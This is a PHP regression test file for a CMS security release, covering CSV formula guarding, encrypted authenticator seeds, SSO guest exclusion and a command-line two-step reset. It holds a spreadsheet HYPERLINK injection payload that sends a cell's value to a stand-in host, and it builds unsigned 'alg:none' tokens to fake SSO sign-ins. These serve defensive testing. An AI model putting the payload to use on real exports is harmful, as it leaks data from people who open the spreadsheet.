<?php
// Included by full_schema.php after the v427 cases, against its synthetic database only:
// 4.28.0 sign-in and access fixes (N1, N8, authenticator seeds encrypted at rest, the
// command-line two-step reset, and the access Lows).

// ---- N8: write_csv_row() puts every text cell through csv_cell() ----
$csvOut = function (array $row): string { $o = fopen('php://memory', 'w+'); write_csv_row($o, $row); rewind($o); return (string)stream_get_contents($o); };
check($csvOut(['=HYPERLINK("https://example.invalid/","Renew")', '@SUM(A1)', '+1+2', ' -3+4']) === "\"'=HYPERLINK(\"\"https://example.invalid/\"\",\"\"Renew\"\")\",'@SUM(A1),'+1+2,\"' -3+4\"\n",
    'write_csv_row() guards a cell that would run as a spreadsheet formula');
check($csvOut([csv_cell('=1+1'), csv_cell(csv_cell('-x'))]) === "'=1+1,'-x\n", 'A cell the caller already guarded is not guarded twice');
check($csvOut([12, -3.5, null, '-1,250.00', '-$40.00', '-5%', '+3', 'Plain text']) === "12,-3.5,,\"-1,250.00\",-\$40.00,-5%,+3,\"Plain text\"\n",
    'Numbers, empty cells and formatted amounts are written unchanged');
// The staff compliance download (the N8 report): a credential named as a formula is guarded.
$db->exec("INSERT INTO users (name,email,password_hash,role) VALUES ('Csv Synthetic 428','csv428@example.invalid','test428csv','instructor')");
$csvUid = (int)$db->lastInsertId();
try {
    $db->prepare("INSERT INTO staff_credentials (user_id, name, expires_on) VALUES (?, '=HYPERLINK(\"https://example.invalid/?d=\"&A2,\"Renew\")', DATE_ADD(CURDATE(), INTERVAL 10 DAY))")->execute([$csvUid]);
    [$code, $csv, $err] = $renderPage('staff_report', ['download' => '1']);
    check(str_contains($csv, "'=HYPERLINK") && !str_contains($csv, '"=HYPERLINK') && !str_contains($csv, ',=HYPERLINK'), 'The staff compliance spreadsheet never holds a live formula' . ($err ? ": $err" : ''));
} catch (PDOException $e) {
    echo "SKIP: staff_credentials not in this schema ({$e->getCode()})\n";
}

// ---- Authenticator seeds are stored encrypted (users.totp_secret) ----
require_once $root . '/public/inc/totp.php';
require_once $root . '/public/inc/account_actions.php';
$seed428 = totp_generate_secret();
$sealed428 = totp_secret_store($seed428);
check(str_starts_with($sealed428, 'v1:') && strlen($sealed428) <= 64 && !str_contains($sealed428, $seed428) && totp_secret_plain($sealed428) === $seed428,
    'An authenticator seed is stored encrypted, fits the column, and reads back');
check(totp_secret_plain($seed428) === $seed428 && totp_secret_plain(null) === null && totp_secret_plain('') === null
    && totp_secret_plain('v1:' . base64_encode(random_bytes(44))) === null, 'A seed stored before 4.28.0 still reads; a damaged one reads as none');
check(totp_secret_store($sealed428) === $sealed428, 'Storing an already encrypted value leaves it as it is');
// Turning it on (My Account and the app share account_totp_confirm) stores the sealed form.
$db->prepare("INSERT INTO users (name,email,password_hash,role) VALUES ('Seal Synthetic 428','seal428@example.invalid',?,'instructor')")->execute([password_hash('Synthetic428 password', PASSWORD_DEFAULT)]);
$sealUid = (int)$db->lastInsertId();
$r = account_totp_confirm(['id' => $sealUid, 'name' => 'Seal Synthetic 428', 'email' => 'seal428@example.invalid'], $seed428, 'pw', totp_code($seed428), fn($p, $w) => null);
$stored = (string)$db->query("SELECT totp_secret FROM users WHERE id=$sealUid")->fetchColumn();
check($r['ok'] && str_starts_with($stored, 'v1:') && totp_secret_plain($stored) === $seed428, 'Turning on the authenticator app stores the seed encrypted');
// Signing in with it on the website works, and a plain seed from before is re-stored encrypted.
$db->prepare('UPDATE users SET password_hash=? WHERE id=?')->execute(['test428seal', $sealUid]);
$db->prepare("INSERT INTO login_otps (user_id, code_hash, expires_at, channel) VALUES (?,?, DATE_ADD(NOW(), INTERVAL 10 MINUTE), 'web')")->execute([$sealUid, password_hash(bin2hex(random_bytes(8)), PASSWORD_DEFAULT)]);
putenv('CMS_TEST_ANON=1');
putenv('CMS_TEST_SESSION=' . json_encode(['pending_user_id' => $sealUid, 'pending_at' => time(), 'pending_credential_version' => hash('sha256', 'test428seal')]));
[$code, $html, $err] = $renderPage('verify', []);
check(preg_match('~<label for="code">6-digit code <span class="hint">[^<]+</span></label>~', $html) === 1 && !str_contains($html, 'code-hint'),
    'The sign-in code hint is inside its label, with no separate described-by line' . ($err ? ": $err" : ''));
$renderPage('verify', [], ['code' => totp_code($seed428)]);
check((int)$db->query("SELECT COUNT(*) FROM audit_log WHERE action='login' AND entity_id=$sealUid")->fetchColumn() === 1, 'An encrypted seed signs in on the website');
$legacy428 = totp_generate_secret();
$db->prepare("INSERT INTO users (name,email,password_hash,role,totp_enabled,totp_secret) VALUES ('Legacy Synthetic 428','legacy428@example.invalid','test428legacy','instructor',1,?)")->execute([$legacy428]);
$legacyUid = (int)$db->lastInsertId();
$db->prepare("INSERT INTO login_otps (user_id, code_hash, expires_at, channel) VALUES (?,?, DATE_ADD(NOW(), INTERVAL 10 MINUTE), 'web')")->execute([$legacyUid, password_hash(bin2hex(random_bytes(8)), PASSWORD_DEFAULT)]);
putenv('CMS_TEST_SESSION=' . json_encode(['pending_user_id' => $legacyUid, 'pending_at' => time(), 'pending_credential_version' => hash('sha256', 'test428legacy')]));
$renderPage('verify', [], ['code' => totp_code($legacy428)]);
$legacyStored = (string)$db->query("SELECT totp_secret FROM users WHERE id=$legacyUid")->fetchColumn();
check((int)$db->query("SELECT COUNT(*) FROM audit_log WHERE action='login' AND entity_id=$legacyUid")->fetchColumn() === 1
    && str_starts_with($legacyStored, 'v1:') && totp_secret_plain($legacyStored) === $legacy428, 'A plain seed from before 4.28.0 signs in and is then stored encrypted');
putenv('CMS_TEST_ANON'); putenv('CMS_TEST_SESSION');

// ---- N1: Microsoft auto-provisioning admits only members of the organisation ----
$tid428 = '11111111-2222-3333-4444-555555555428';
$cid428 = '99999999-8888-7777-6666-555555555428';
$db->exec("INSERT INTO `groups` (name, perms) VALUES ('Synthetic SSO group 428', 'clients')");
$entraKeep = $db->query("SELECT name, value FROM settings WHERE name IN ('entra_enabled','entra_tenant_id','entra_client_id','entra_auto_provision_group')")->fetchAll(PDO::FETCH_KEY_PAIR);
$setEntra = $db->prepare('INSERT INTO settings (name, value) VALUES (?,?) ON DUPLICATE KEY UPDATE value = VALUES(value)');
foreach (['entra_enabled' => '1', 'entra_tenant_id' => $tid428, 'entra_client_id' => $cid428, 'entra_auto_provision_group' => 'Synthetic SSO group 428'] as $k => $v) $setEntra->execute([$k, $v]);
$ssoReturn = function (array $claims) use ($renderPage, $tid428, $cid428): void {
    $nonce = bin2hex(random_bytes(8)); $state = bin2hex(random_bytes(8));
    $claims += ['iss' => "https://login.microsoftonline.com/$tid428/v2.0", 'aud' => $cid428, 'tid' => $tid428, 'exp' => time() + 600, 'nonce' => $nonce];
    $b64 = fn(string $s) => rtrim(strtr(base64_encode($s), '+/', '-_'), '=');
    putenv('CMS_TEST_SSO_TOKENS=' . json_encode(['id_token' => $b64('{"alg":"none"}') . '.' . $b64(json_encode($claims)) . '.' . $b64('sig')]));
    putenv('CMS_TEST_ANON=1');
    putenv('CMS_TEST_SESSION=' . json_encode(['sso_state' => $state, 'sso_nonce' => $nonce]));
    $renderPage('sso', ['code' => 'synthetic-code', 'state' => $state]);
    putenv('CMS_TEST_SSO_TOKENS'); putenv('CMS_TEST_ANON'); putenv('CMS_TEST_SESSION');
};
$ssoReturn(['oid' => 'guest-oid-428', 'email' => 'guest428@example.invalid', 'name' => 'Guest Synthetic 428', 'acct' => 1]);
check(!(int)$db->query("SELECT COUNT(*) FROM users WHERE email='guest428@example.invalid'")->fetchColumn()
    && (int)$db->query("SELECT COUNT(*) FROM audit_log WHERE action='login.sso_fail' AND detail LIKE '%no account was created: guest428@example.invalid'")->fetchColumn() === 1,
    'A guest (acct 1) in the tenant gets no account from auto-provisioning, and the refusal is audited');
$ssoReturn(['oid' => 'noacct-oid-428', 'email' => 'noacct428@example.invalid', 'name' => 'No Acct Synthetic 428']);
check(!(int)$db->query("SELECT COUNT(*) FROM users WHERE email='noacct428@example.invalid'")->fetchColumn(), 'Without the acct claim no account is created');
$ssoReturn(['oid' => 'member-oid-428', 'email' => 'member428@example.invalid', 'name' => 'Member Synthetic 428', 'acct' => 0]);
check((int)$db->query("SELECT COUNT(*) FROM users WHERE email='member428@example.invalid' AND entra_oid='member-oid-428'")->fetchColumn() === 1,
    'A member (acct 0) of the tenant is still given an account');
$db->exec("DELETE FROM settings WHERE name IN ('entra_enabled','entra_tenant_id','entra_client_id','entra_auto_provision_group')");
foreach ($entraKeep as $k => $v) $setEntra->execute([$k, $v]);
[$code, $html, $err] = $renderPage('federation', []);
check(str_contains($html, 'href="admin.php#people-h"') && !str_contains($html, 'anyone in your Microsoft tenant')
    && !str_contains($html, 'apg-help') && !str_contains($html, 'tenant-help')
    && preg_match('~<label for="auto_provision_group">[^<]+<span class="hint">[^<]*not a guest~', $html) === 1,
    'Federation: hints inside labels, guests named, and the People link goes to Administration' . ($err ? ": $err" : ''));

// ---- Users: two-step reset wording, and the caseload transfer error on its field ----
$db->exec("INSERT INTO users (name,email,password_hash,role,totp_enabled,totp_secret) VALUES ('Reset Synthetic 428','reset428@example.invalid','test428reset','instructor',1,'" . totp_generate_secret() . "')");
$resetUid = (int)$db->lastInsertId();
$epochBefore = (int)$db->query("SELECT session_epoch FROM users WHERE id=$resetUid")->fetchColumn();
[$code, $html, $err] = $renderPage('users', ['id' => (string)$resetUid]);
check(str_contains($html, 'signed out of every web browser too') && !str_contains($html, 'email codes keep working')
    && !str_contains($html, 'u_hours-hint') && !str_contains($html, 'to_user-hint'), 'Users: the reset says browsers are signed out; hints are inside labels' . ($err ? ": $err" : ''));
$renderPage('users', [], ['uid' => (string)$resetUid, 'reset_2fa' => '1']);
check((int)$db->query("SELECT totp_enabled FROM users WHERE id=$resetUid")->fetchColumn() === 0
    && (int)$db->query("SELECT session_epoch FROM users WHERE id=$resetUid")->fetchColumn() === $epochBefore + 1, 'The Users reset still clears the authenticator and ends browser sessions');
putenv('CMS_TEST_SESSION_ADD=' . json_encode(['field_errors' => ['to_user' => 'Choose who receives the caseload.']]));
[$code, $html, $err] = $renderPage('users', ['id' => (string)$resetUid]);
putenv('CMS_TEST_SESSION_ADD');
check(preg_match('~<select id="to_user" name="to_user" aria-invalid="true" aria-describedby="err-to_user">~', $html) === 1
    && str_contains($html, 'id="err-to_user"') && str_contains($html, 'href="#to_user"'), 'A caseload transfer error is tied to the "Move … to" list, with a summary link' . ($err ? ": $err" : ''));

// ---- Staff agreements: after an error the new form keeps "Who signs it", On and Confidentiality ----
putenv('CMS_TEST_SESSION_ADD=' . json_encode(['old_input' => ['save_agreement' => '1', 'agreement_id' => '0', 'title' => 'Synthetic exit 428', 'body' => '', 'kind' => 'exit', 'active' => '1', 'counts_as_confidentiality' => '1']]));
[$code, $html, $err] = $renderPage('staff_agreements', ['new' => '1']);
putenv('CMS_TEST_SESSION_ADD');
check(preg_match('~name="kind" value="exit" checked~', $html) === 1 && preg_match('~name="kind" value="staff" checked~', $html) === 0
    && preg_match('~name="active" value="1" checked~', $html) === 1, 'Staff agreements: a redisplayed new form keeps "Someone leaving" and On' . ($err ? ": $err" : ''));
[$code, $html, $err] = $renderPage('staff_agreements', ['new' => '1']);
check(preg_match('~name="kind" value="staff" checked~', $html) === 1 && preg_match('~name="active" value="1" checked~', $html) === 0, 'A fresh new form starts at All staff, off');

// ---- Staff training: the hold preview never changes the saved setting ----
$holdKeep = $db->query("SELECT name, value FROM settings WHERE name IN ('access_hold','access_hold_days')")->fetchAll(PDO::FETCH_KEY_PAIR);
$db->exec("INSERT INTO staff_agreements (title, body, kind, active, activated_at) VALUES ('Synthetic hold agreement 428', 'Text.', 'staff', 1, DATE_SUB(NOW(), INTERVAL 400 DAY))");
$holdAg = (int)$db->lastInsertId();
$renderPage('staff_training', [], ['save_hold' => '1', 'access_hold' => 'all', 'access_hold_days' => '5']);
$holdAfter = $db->query("SELECT name, value FROM settings WHERE name IN ('access_hold','access_hold_days')")->fetchAll(PDO::FETCH_KEY_PAIR);
$db->exec("DELETE FROM staff_agreements WHERE id = $holdAg");
check($holdAfter == $holdKeep, 'The hold preview leaves the saved access-hold setting exactly as it was (none written, none blanked)');

// ---- My Account: hints inside labels ----
putenv('CMS_TEST_SESSION_ADD=' . json_encode(['totp_pending_secret' => totp_generate_secret()]));
[$code, $html, $err] = $renderPage('account', []);
putenv('CMS_TEST_SESSION_ADD');
check(!str_contains($html, 'totp_pw-hint') && !str_contains($html, 'totp_code-hint') && !str_contains($html, 'admin-link-hint')
    && preg_match('~<label for="totp_code">[^<]+<span class="hint">~', $html) === 1 && str_contains($html, 'e.fromServer'),
    'My Account: the authenticator hints are inside their labels, and the passkey script shows the server\'s message' . ($err ? ": $err" : ''));

// ---- cron/reset_2fa.php: the sole administrator's way back in ----
$db->exec("INSERT INTO users (name,email,password_hash,role,totp_enabled,totp_secret) VALUES ('Cli Synthetic 428','cli428@example.invalid','test428cli','admin',1,'" . totp_secret_store(totp_generate_secret()) . "')");
$cliUid = (int)$db->lastInsertId();
$db->prepare("INSERT INTO passkeys (user_id, credential_id, public_key, name) VALUES (?, 'synthetic-cred-428', 'synthetic-key', 'Synthetic phone')")->execute([$cliUid]);
$db->exec("INSERT INTO login_attempts (ip, email, success) VALUES ('192.0.2.28','verify:cli428@example.invalid',0)");
$cliEpoch = (int)$db->query("SELECT session_epoch FROM users WHERE id=$cliUid")->fetchColumn();
$runCli = function (array $args, ?string $wrapper = null) use ($root, $tmp): array {
    $p = proc_open(array_merge([PHP_BINARY, '-d', 'display_errors=stderr', '-d', 'sendmail_path=/usr/bin/true', $wrapper ?? $root . '/cron/reset_2fa.php'], $args), [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
    fclose($pipes[0]);
    $out = stream_get_contents($pipes[1]); $err = stream_get_contents($pipes[2]); fclose($pipes[1]); fclose($pipes[2]);
    return [proc_close($p), $out, $err];
};
// Refused when it is not the command line (a web server sets REQUEST_METHOD).
file_put_contents($tmp . '/reset_2fa_web.php', '<?php $_SERVER["REQUEST_METHOD"] = "GET"; require ' . var_export($root . '/cron/reset_2fa.php', true) . ';');
[$c, $out] = $runCli(['--email=cli428@example.invalid', '--core=' . $tmp . '/core.php', '--yes'], $tmp . '/reset_2fa_web.php');
check(str_contains($out, 'only from the server') && (int)$db->query("SELECT totp_enabled FROM users WHERE id=$cliUid")->fetchColumn() === 1, 'reset_2fa.php refuses to run from a web request');
[$c, $out] = $runCli(['--email=nobody428@example.invalid', '--core=' . $tmp . '/core.php', '--yes']);
check($c === 1, 'reset_2fa.php names an unknown email and changes nothing');
[$c, $out] = $runCli(['--email=cli428@example.invalid', '--core=' . $tmp . '/core.php']);
check($c === 1 && (int)$db->query("SELECT totp_enabled FROM users WHERE id=$cliUid")->fetchColumn() === 1, 'Without --yes, an unconfirmed reset changes nothing');
// As Help gives it: the email as a plain word (any letter case), options before or after.
[$c, $out, $err] = $runCli(['--core=' . $tmp . '/core.php', 'CLI428@example.invalid', '--yes']);
$cliRow = $db->query("SELECT totp_enabled, totp_secret, session_epoch FROM users WHERE id=$cliUid")->fetch();
check($c === 0 && (int)$cliRow['totp_enabled'] === 0 && $cliRow['totp_secret'] === null && (int)$cliRow['session_epoch'] === $cliEpoch + 1
    && !(int)$db->query("SELECT COUNT(*) FROM passkeys WHERE user_id=$cliUid")->fetchColumn()
    && !(int)$db->query("SELECT COUNT(*) FROM login_attempts WHERE email='verify:cli428@example.invalid'")->fetchColumn()
    && (int)$db->query("SELECT COUNT(*) FROM audit_log WHERE action='user.reset_2fa' AND entity_id=$cliUid AND detail LIKE 'from the command line%'")->fetchColumn() === 1
    && str_contains($out, 'The authenticator app was turned off.') && str_contains($out, 'Signed out of every web browser.') && str_contains($out, 'Recorded in the audit log.'),
    'reset_2fa.php turns off two-step verification, ends sessions, clears the lockout, audits and says what it did' . ($err ? ": $err" : ''));

// ---- A stored seed this server cannot read: never "wrong code" forever, never emailed codes ----
$badSeed = 'v1:' . base64_encode(random_bytes(44));
check(totp_seed_state(['totp_enabled' => 0, 'totp_secret' => null]) === 'none' && totp_seed_state(['totp_enabled' => 1, 'totp_secret' => $sealed428]) === 'ok'
    && totp_seed_state(['totp_enabled' => 1, 'totp_secret' => $badSeed]) === 'unreadable' && totp_seed_present(['totp_enabled' => 1, 'totp_secret' => $badSeed]),
    'totp_seed_state() tells none, ok and unreadable apart; an unreadable seed still makes the account authenticator-only');
$db->prepare("INSERT INTO users (name,email,password_hash,role,totp_enabled,totp_secret) VALUES ('Unreadable Synthetic 428','unread428@example.invalid',?,'instructor',1,?)")
    ->execute([password_hash('Synthetic428 unread', PASSWORD_DEFAULT), $badSeed]);
$unreadUid = (int)$db->lastInsertId();
putenv('CMS_TEST_ANON=1');
[$code, $html, $err] = $renderPage('login', [], ['email' => 'unread428@example.invalid', 'password' => 'Synthetic428 unread']);
check(str_contains($html, h(TOTP_UNREADABLE_MSG)) && !(int)$db->query("SELECT COUNT(*) FROM login_otps WHERE user_id=$unreadUid")->fetchColumn()
    && (int)$db->query("SELECT COUNT(*) FROM audit_log WHERE action='login.totp_unreadable' AND entity_id=$unreadUid")->fetchColumn() === 1,
    'Signing in with an unreadable seed says so plainly, sends no code, and is audited' . ($err ? ": $err" : ''));
$db->prepare("UPDATE users SET password_hash='test428unread' WHERE id=?")->execute([$unreadUid]);
putenv('CMS_TEST_SESSION=' . json_encode(['pending_user_id' => $unreadUid, 'pending_at' => time(), 'pending_credential_version' => hash('sha256', 'test428unread')]));
[$code, $html, $err] = $renderPage('verify', [], ['code' => '123456']);
check(str_contains($html, h(TOTP_UNREADABLE_MSG)) && !str_contains($html, 'Send a new code')
    && (int)$db->query("SELECT COUNT(*) FROM audit_log WHERE action='login.totp_unreadable' AND entity_id=$unreadUid")->fetchColumn() === 2
    && !(int)$db->query("SELECT COUNT(*) FROM audit_log WHERE action='login' AND entity_id=$unreadUid")->fetchColumn(),
    'The code step says the same and offers no emailed code' . ($err ? ": $err" : ''));
putenv('CMS_TEST_ANON'); putenv('CMS_TEST_SESSION');
$db->prepare("UPDATE users SET totp_enabled=0, totp_secret=NULL WHERE id=?")->execute([$unreadUid]);

// ---- The key file: never re-made while stored values need it; System health says when it is wrong ----
$keyFile = $tmp . '/meeting_tokens.key';
$keyBytes = (string)file_get_contents($keyFile);
rename($keyFile, $keyFile . '.kept');
[$code, $html, $err] = $renderPage('system_health', []);
check(str_contains($html, 'meeting_tokens.key is missing'), 'System health reports a missing key file while seeds need it' . ($err ? ": $err" : ''));
$db->prepare("INSERT INTO login_otps (user_id, code_hash, expires_at, channel) VALUES (?,?, DATE_ADD(NOW(), INTERVAL 10 MINUTE), 'web')")->execute([$sealUid, password_hash(bin2hex(random_bytes(8)), PASSWORD_DEFAULT)]);
putenv('CMS_TEST_ANON=1');
putenv('CMS_TEST_SESSION=' . json_encode(['pending_user_id' => $sealUid, 'pending_at' => time(), 'pending_credential_version' => hash('sha256', 'test428seal')]));
[$code, $html, $err] = $renderPage('verify', [], ['code' => totp_code($seed428)]);
putenv('CMS_TEST_ANON'); putenv('CMS_TEST_SESSION');
check(!is_file($keyFile) && str_contains($html, h(TOTP_UNREADABLE_MSG)), 'With the key file gone, no new key is made and the sign-in says why it cannot finish' . ($err ? ": $err" : ''));
file_put_contents($keyFile, base64_encode(random_bytes(32))); chmod($keyFile, 0600);
[$code, $html, $err] = $renderPage('system_health', []);
check(str_contains($html, 'does not match the stored authenticator apps'), 'System health reports a replaced key file' . ($err ? ": $err" : ''));
unlink($keyFile); rename($keyFile . '.kept', $keyFile);
check((string)file_get_contents($keyFile) === $keyBytes && totp_secret_plain($sealed428) === $seed428, 'With the original key file back, the seeds read again');
[$code, $html, $err] = $renderPage('system_health', []);
check(!str_contains($html, 'meeting_tokens.key'), 'System health is quiet about the key file when it is right' . ($err ? ": $err" : ''));
